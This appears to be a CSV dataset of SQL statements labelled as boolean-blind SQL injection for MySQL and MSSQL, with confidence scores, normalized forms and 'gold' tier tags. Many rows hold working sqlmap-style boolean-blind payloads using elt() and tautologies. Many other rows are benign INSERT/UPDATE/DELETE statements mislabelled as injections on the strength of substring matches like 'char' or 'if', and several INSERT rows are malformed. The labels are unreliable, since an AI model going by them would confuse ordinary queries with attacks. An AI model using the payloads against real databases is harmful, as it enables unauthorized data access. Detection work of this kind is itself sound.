id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree,payload_norm,wrapper_detected,strip_depth,payload_delex_v2,signature,tier
7546,DELETE FROM character WHERE passage = 'grandfather',boolean_blind,mssql,0.9,Signals: 'char'; Boolean-blind SQLi (OR/AND logic); DB: mssql,2,DELETE FROM character WHERE passage = 'grandfather',False,0,delete from __IDENT__ where __IDENT__ = __STR__,dba3286b,gold
9030,"INSERT INTO base ( wind, view, eat, characteristic, fell, familiar ) VALUES ( 'careful', 'struck'. sick', 'circus', 'star', 'amount', 'separate' )",boolean_blind,mssql,0.9,Signals: 'char'; Boolean-blind SQLi (OR/AND logic); DB: mssql,2,"INSERT INTO base ( wind, view, eat, characteristic, fell, familiar ) VALUES ( 'careful', 'struck'. sick', 'circus', 'star', 'amount', 'separate' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,gold
6612,"INSERT INTO pressure ( giving, prize, powder, mail, work, common ) VALUES ( 'chosen', 'roll'. characteristic', 'somebody', 'soon', 'before', 'rest' )",boolean_blind,mssql,0.9,Signals: 'char'; Boolean-blind SQLi (OR/AND logic); DB: mssql,2,"INSERT INTO pressure ( giving, prize, powder, mail, work, common ) VALUES ( 'chosen', 'roll'. characteristic', 'somebody', 'soon', 'before', 'rest' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,gold
6332,"INSERT INTO safety ( swam, alphabet, bean, character, blood, tree ) VALUES ( 'pass', 'dropped'. verb', 'chapter', 'important', 'way', 'zebra' )",boolean_blind,mssql,0.9,Signals: 'char'; Boolean-blind SQLi (OR/AND logic); DB: mssql,2,"INSERT INTO safety ( swam, alphabet, bean, character, blood, tree ) VALUES ( 'pass', 'dropped'. verb', 'chapter', 'important', 'way', 'zebra' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,gold
33884,"UPDATE putting SET charge = 'went', City = 'dozen' WHERE signal = rate",boolean_blind,mssql,0.9,Signals: 'char'; Boolean-blind SQLi (OR/AND logic); DB: mssql,2,"UPDATE putting SET charge = 'went', City = 'dozen' WHERE signal = rate",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,gold
35742,"UPDATE chart SET pleasant = 'diameter', City = 'post' WHERE get = diagram",boolean_blind,mssql,0.9,Signals: 'char'; Boolean-blind SQLi (OR/AND logic); DB: mssql,2,"UPDATE chart SET pleasant = 'diameter', City = 'post' WHERE get = diagram",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,gold
735,"-1425"" ) where 8056 = 8056 or elt ( 1032 = 1032,3623 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"-1425"" ) where 8056 = 8056 or elt ( 1032 = 1032,3623 ) --",False,0,"-__INT__"" ) where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",0c2505ea,gold
25290,"-4407"" ) where 2055 = 2055 or elt ( 9714 = 5040,5040 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"-4407"" ) where 2055 = 2055 or elt ( 9714 = 5040,5040 ) --",False,0,"-__INT__"" ) where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",0c2505ea,gold
2527,"-4699 ) as mymz where 3405 = 3405 or elt ( 1032 = 1032,3623 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"-4699 ) as mymz where 3405 = 3405 or elt ( 1032 = 1032,3623 ) --",False,0,"-__INT__ ) as __IDENT__ where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",0d640bf3,gold
24168,"-9698 ) as pvhn where 3223 = 3223 or elt ( 6563 = 9210,9210 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"-9698 ) as pvhn where 3223 = 3223 or elt ( 6563 = 9210,9210 ) --",False,0,"-__INT__ ) as __IDENT__ where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",0d640bf3,gold
10228,"INSERT INTO naturally ( stretch, foreign, found, beside, experience, push ) VALUES ( 'saw', 'finest'. globe', 'older', 'former', 'record', 'boy' )",boolean_blind,mysql,1.0,"Signals: 'ord', 'exp'; Boolean-blind SQLi (OR/AND logic); DB: mysql",2,"INSERT INTO naturally ( stretch, foreign, found, beside, experience, push ) VALUES ( 'saw', 'finest'. globe', 'older', 'former', 'record', 'boy' )",False,0,"insert into __IDENT__ ( __IDENT__ , foreign , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",0f3cfe62,gold
6147,"INSERT INTO bark ( triangle, due, potatoes ) VALUES ( 'felt', 'graph', 'beside' )",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"INSERT INTO bark ( triangle, due, potatoes ) VALUES ( 'felt', 'graph', 'beside' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",16135e94,gold
10229,"INSERT INTO account ( metal, dozen, courage ) VALUES ( 'now', 'explanation', 'plural' )",boolean_blind,mysql,0.9,Signals: 'exp'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"INSERT INTO account ( metal, dozen, courage ) VALUES ( 'now', 'explanation', 'plural' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",16135e94,gold
7911,"INSERT INTO exist ( syllable, strength, behavior ) VALUES ( 'specific', 'greater', 'vast' )",boolean_blind,mysql,0.9,Signals: 'if'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"INSERT INTO exist ( syllable, strength, behavior ) VALUES ( 'specific', 'greater', 'vast' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",16135e94,gold
7540,"INSERT INTO down ( myself, important, coal ) VALUES ( 'while', 'scientific', 'fourth' )",boolean_blind,mysql,0.9,Signals: 'if'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"INSERT INTO down ( myself, important, coal ) VALUES ( 'while', 'scientific', 'fourth' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",16135e94,gold
4472,"INSERT INTO pilot ( daughter, card, anyone ) VALUES ( 'load', 'brick', 'experience' )",boolean_blind,mysql,0.9,Signals: 'exp'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"INSERT INTO pilot ( daughter, card, anyone ) VALUES ( 'load', 'brick', 'experience' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",16135e94,gold
8005,"INSERT INTO difficult ( explanation, complete, someone ) VALUES ( 'nervous', 'wear', 'spite' )",boolean_blind,mysql,1.0,"Signals: 'if', 'exp'; Boolean-blind SQLi (OR/AND logic); DB: mysql",2,"INSERT INTO difficult ( explanation, complete, someone ) VALUES ( 'nervous', 'wear', 'spite' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",16135e94,gold
35713,"INSERT INTO arrow ( instant, expression, lungs ) VALUES ( 'thin', 'mixture', 'former' )",boolean_blind,mysql,0.9,Signals: 'exp'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"INSERT INTO arrow ( instant, expression, lungs ) VALUES ( 'thin', 'mixture', 'former' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",16135e94,gold
33881,"INSERT INTO shelter ( third, disease, dance ) VALUES ( 'cause', 'wrote', 'eight' )",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"INSERT INTO shelter ( third, disease, dance ) VALUES ( 'cause', 'wrote', 'eight' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",16135e94,gold
7632,"INSERT INTO mine ( yourself, shelf, rest ) VALUES ( 'melted', 'area', 'forgotten' )",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"INSERT INTO mine ( yourself, shelf, rest ) VALUES ( 'melted', 'area', 'forgotten' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",16135e94,gold
2039,"-9764' where 1266 = 1266 or elt ( 4069 = 6162,6162 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"-9764' where 1266 = 1266 or elt ( 4069 = 6162,6162 ) --",False,0,"-__INT__' where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",176a2270,gold
21151,"-4005' where 3963 = 3963 or elt ( 1032 = 1032,3623 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"-4005' where 3963 = 3963 or elt ( 1032 = 1032,3623 ) --",False,0,"-__INT__' where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",176a2270,gold
22300,"1' where 4150 = 4150 and elt ( 8012 = 6026,6026 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"1' where 4150 = 4150 and elt ( 8012 = 6026,6026 ) --",False,0,"__INT__' where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",1ce1c8c3,gold
23113,"1' where 3425 = 3425 and elt ( 4249 = 4249,7259 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"1' where 3425 = 3425 and elt ( 4249 = 4249,7259 ) --",False,0,"__INT__' where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",1ce1c8c3,gold
20046,"-6505' ) ) as jtnp where 1037 = 1037 or elt ( 1032 = 1032,3623 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"-6505' ) ) as jtnp where 1037 = 1037 or elt ( 1032 = 1032,3623 ) --",False,0,"-__INT__' ) ) as __IDENT__ where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",1e44c385,gold
22420,"-4259' ) ) as usqu where 5419 = 5419 or elt ( 8325 = 8837,8837 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"-4259' ) ) as usqu where 5419 = 5419 or elt ( 8325 = 8837,8837 ) --",False,0,"-__INT__' ) ) as __IDENT__ where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",1e44c385,gold
19423,"1"" ) ) as pxdp where 4575 = 4575 and elt ( 8258 = 7218,7218 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"1"" ) ) as pxdp where 4575 = 4575 and elt ( 8258 = 7218,7218 ) --",False,0,"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",2a9f513d,gold
21978,"1"" ) ) as eagr where 3366 = 3366 and elt ( 4249 = 4249,7259 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"1"" ) ) as eagr where 3366 = 3366 and elt ( 4249 = 4249,7259 ) --",False,0,"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",2a9f513d,gold
1247,"1"" where 9135 = 9135 and elt ( 4249 = 4249,7259 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"1"" where 9135 = 9135 and elt ( 4249 = 4249,7259 ) --",False,0,"__INT__"" where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",2af931ec,gold
21152,"1"" where 4082 = 4082 and elt ( 5699 = 1432,1432 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"1"" where 4082 = 4082 and elt ( 5699 = 1432,1432 ) --",False,0,"__INT__"" where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",2af931ec,gold
9122,"INSERT INTO grow ( shall, kill, paragraph, spirit, recall, if ) VALUES ( 'goose', 'speed'. spent', 'lesson', 'season', 'many', 'salmon' )",boolean_blind,mysql,0.9,Signals: 'if'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"INSERT INTO grow ( shall, kill, paragraph, spirit, recall, if ) VALUES ( 'goose', 'speed'. spent', 'lesson', 'season', 'many', 'salmon' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , if ) values ( __STR__ , __STR__. __IDENT__' )",3fe8e284,gold
1642,"1' ) as taay where 7027 = 7027 and elt ( 4249 = 4249,7259 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"1' ) as taay where 7027 = 7027 and elt ( 4249 = 4249,7259 ) --",False,0,"__INT__' ) as __IDENT__ where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",42a6058b,gold
20464,"1' ) as afnt where 4719 = 4719 and elt ( 8224 = 1275,1275 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"1' ) as afnt where 4719 = 4719 and elt ( 8224 = 1275,1275 ) --",False,0,"__INT__' ) as __IDENT__ where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",42a6058b,gold
2506,"-8686"" where 4532 = 4532 or elt ( 3301 = 9065,9065 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"-8686"" where 4532 = 4532 or elt ( 3301 = 9065,9065 ) --",False,0,"-__INT__"" where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",49466f50,gold
22196,"-6254"" where 8941 = 8941 or elt ( 1032 = 1032,3623 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"-6254"" where 8941 = 8941 or elt ( 1032 = 1032,3623 ) --",False,0,"-__INT__"" where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",49466f50,gold
1330,"-8777"" ) as lalf where 8606 = 8606 or elt ( 4397 = 5823,5823 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"-8777"" ) as lalf where 8606 = 8606 or elt ( 4397 = 5823,5823 ) --",False,0,"-__INT__"" ) as __IDENT__ where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",5401f2e1,gold
25777,"-4686"" ) as dxks where 7123 = 7123 or elt ( 1032 = 1032,3623 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"-4686"" ) as dxks where 7123 = 7123 or elt ( 1032 = 1032,3623 ) --",False,0,"-__INT__"" ) as __IDENT__ where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",5401f2e1,gold
20897,"1' ) where 1225 = 1225 and elt ( 8831 = 7779,7779 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"1' ) where 1225 = 1225 and elt ( 8831 = 7779,7779 ) --",False,0,"__INT__' ) where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",541e1708,gold
23752,"1' ) where 8348 = 8348 and elt ( 4249 = 4249,7259 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"1' ) where 8348 = 8348 and elt ( 4249 = 4249,7259 ) --",False,0,"__INT__' ) where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",541e1708,gold
19246,"1' ) ) as peeo where 5356 = 5356 and elt ( 4722 = 2382,2382 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"1' ) ) as peeo where 5356 = 5356 and elt ( 4722 = 2382,2382 ) --",False,0,"__INT__' ) ) as __IDENT__ where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",5f650cdb,gold
23624,"1' ) ) as anaq where 9605 = 9605 and elt ( 4249 = 4249,7259 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"1' ) ) as anaq where 9605 = 9605 and elt ( 4249 = 4249,7259 ) --",False,0,"__INT__' ) ) as __IDENT__ where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",5f650cdb,gold
20927,"1 ) where 2720 = 2720 and elt ( 4249 = 4249,7259 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"1 ) where 2720 = 2720 and elt ( 4249 = 4249,7259 ) --",False,0,"__INT__ ) where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",62db29e5,gold
24095,"1 ) where 9687 = 9687 and elt ( 9607 = 9432,9432 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"1 ) where 9687 = 9687 and elt ( 9607 = 9432,9432 ) --",False,0,"__INT__ ) where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",62db29e5,gold
24179,"-3775' ) as rqet where 7092 = 7092 or elt ( 1032 = 1032,3623 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"-3775' ) as rqet where 7092 = 7092 or elt ( 1032 = 1032,3623 ) --",False,0,"-__INT__' ) as __IDENT__ where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",80747a15,gold
2985,"INSERT INTO which ( mile, friend, finish, monkey, word, then ) VALUES ( 'against', 'recently'. gray', 'sum', 'stock', 'fastened', 'go' )",boolean_blind,mysql,0.9,Signals: 'ord'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"INSERT INTO which ( mile, friend, finish, monkey, word, then ) VALUES ( 'against', 'recently'. gray', 'sum', 'stock', 'fastened', 'go' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , then ) values ( __STR__ , __STR__. __IDENT__' )",8380a040,gold
4938,"INSERT INTO town ( continued, order, would ) VALUES ( 'sell', 'cake', 'industrial' )",boolean_blind,mysql,0.9,Signals: 'ord'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"INSERT INTO town ( continued, order, would ) VALUES ( 'sell', 'cake', 'industrial' )",False,0,"insert into __IDENT__ ( __IDENT__ , order , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",8d8fcfce,gold
2133,"-9810' ) where 4361 = 4361 or elt ( 1032 = 1032,3623 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"-9810' ) where 4361 = 4361 or elt ( 1032 = 1032,3623 ) --",False,0,"-__INT__' ) where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",8fe27bf0,gold
21198,"-8144' ) where 1691 = 1691 or elt ( 7246 = 7816,7816 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"-8144' ) where 1691 = 1691 or elt ( 7246 = 7816,7816 ) --",False,0,"-__INT__' ) where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",8fe27bf0,gold
2486,"1 ) as ihan where 5298 = 5298 and elt ( 6587 = 3479,3479 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"1 ) as ihan where 5298 = 5298 and elt ( 6587 = 3479,3479 ) --",False,0,"__INT__ ) as __IDENT__ where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",a78be804,gold
2623,"1 ) as ocut where 6800 = 6800 and elt ( 4249 = 4249,7259 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"1 ) as ocut where 6800 = 6800 and elt ( 4249 = 4249,7259 ) --",False,0,"__INT__ ) as __IDENT__ where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",a78be804,gold
887,"1"" ) as rovd where 3764 = 3764 and elt ( 4249 = 4249,7259 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"1"" ) as rovd where 3764 = 3764 and elt ( 4249 = 4249,7259 ) --",False,0,"__INT__"" ) as __IDENT__ where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",af2499ec,gold
24780,"1"" ) as zuzm where 1211 = 1211 and elt ( 5458 = 2966,2966 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"1"" ) as zuzm where 1211 = 1211 and elt ( 5458 = 2966,2966 ) --",False,0,"__INT__"" ) as __IDENT__ where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",af2499ec,gold
1666,"1 ) ) as cbdx where 8998 = 8998 and elt ( 4249 = 4249,7259 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"1 ) ) as cbdx where 8998 = 8998 and elt ( 4249 = 4249,7259 ) --",False,0,"__INT__ ) ) as __IDENT__ where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",b0d15aa9,gold
19653,"1 ) ) as fmpr where 3103 = 3103 and elt ( 9970 = 9297,9297 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"1 ) ) as fmpr where 3103 = 3103 and elt ( 9970 = 9297,9297 ) --",False,0,"__INT__ ) ) as __IDENT__ where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",b0d15aa9,gold
9123,"INSERT INTO give ( road, mighty, excellent ) VALUES ( 'if', 'flow', 'everything' )",boolean_blind,mysql,0.9,Signals: 'if'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"INSERT INTO give ( road, mighty, excellent ) VALUES ( 'if', 'flow', 'everything' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( if , __STR__ , __STR__ )",baf9005f,gold
1333,"-8924 ) ) as jybr where 7901 = 7901 or elt ( 1032 = 1032,3623 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"-8924 ) ) as jybr where 7901 = 7901 or elt ( 1032 = 1032,3623 ) --",False,0,"-__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",c011c9ac,gold
2543,"-9432 ) ) as nqya where 8387 = 8387 or elt ( 9242 = 6180,6180 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"-9432 ) ) as nqya where 8387 = 8387 or elt ( 9242 = 6180,6180 ) --",False,0,"-__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",c011c9ac,gold
34577,"UPDATE call SET member = 'fifteen', City = 'roar' WHERE first = spend",boolean_blind,mysql,0.9,Signals: 'if'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"UPDATE call SET member = 'fifteen', City = 'roar' WHERE first = spend",False,0,"update call set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",c394631e,gold
33984,UPDATE express SET several = 'young'WHERE route = 'paper',boolean_blind,mysql,0.9,Signals: 'exp'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,UPDATE express SET several = 'young'WHERE route = 'paper',False,0,update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,c3d062a2,gold
5688,UPDATE lift SET try = 'thin'WHERE occur = 'season',boolean_blind,mysql,0.9,Signals: 'if'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,UPDATE lift SET try = 'thin'WHERE occur = 'season',False,0,update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,c3d062a2,gold
6617,UPDATE particular SET melted = 'hunter'WHERE example = 'satellites',boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,UPDATE particular SET melted = 'hunter'WHERE example = 'satellites',False,0,update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,c3d062a2,gold
7544,UPDATE individual SET one = 'instance'WHERE dish = 'gift',boolean_blind,mysql,1.0,"Signals: 'if', 'dual'; Boolean-blind SQLi (OR/AND logic); DB: mysql",2,UPDATE individual SET one = 'instance'WHERE dish = 'gift',False,0,update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,c3d062a2,gold
19406,"-3361 where 1335 = 1335 or elt ( 5891 = 5092,5092 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"-3361 where 1335 = 1335 or elt ( 5891 = 5092,5092 ) --",False,0,"-__INT__ where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",c7dc7e83,gold
22532,"-9526 where 5734 = 5734 or elt ( 1032 = 1032,3623 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"-9526 where 5734 = 5734 or elt ( 1032 = 1032,3623 ) --",False,0,"-__INT__ where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",c7dc7e83,gold
2715,"-3649"" ) ) as eydu where 3220 = 3220 or elt ( 8705 = 1510,1510 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"-3649"" ) ) as eydu where 3220 = 3220 or elt ( 8705 = 1510,1510 ) --",False,0,"-__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",c89e1482,gold
23593,"-7808"" ) ) as jgkk where 9230 = 9230 or elt ( 1032 = 1032,3623 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"-7808"" ) ) as jgkk where 9230 = 9230 or elt ( 1032 = 1032,3623 ) --",False,0,"-__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",c89e1482,gold
